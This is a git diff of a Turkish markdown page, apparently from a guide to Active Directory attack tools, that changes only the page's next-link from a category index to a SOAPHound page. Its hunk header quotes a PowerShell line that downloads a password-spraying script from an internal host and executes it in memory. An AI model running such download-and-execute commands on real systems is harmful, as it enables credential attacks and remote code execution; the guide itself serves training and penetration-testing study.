@@ -367,4 +367,4 @@ IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/spray.ps1'); I
 
 ---
 
-> **Önceki:** [← DomainPasswordSpray](./DomainPasswordSpray.md) · **Sonraki:** [← Kategori 04: Zehirleme, MitM ve Zorlamalı Kimlik Doğrulama](../Kategori_04_Zehirleme_MitM_ve_Zorlamali_Kimlik/README.md)
+> **Önceki:** [← DomainPasswordSpray](./DomainPasswordSpray.md) · **Sonraki:** [SOAPHound →](./SOAPHound.md)
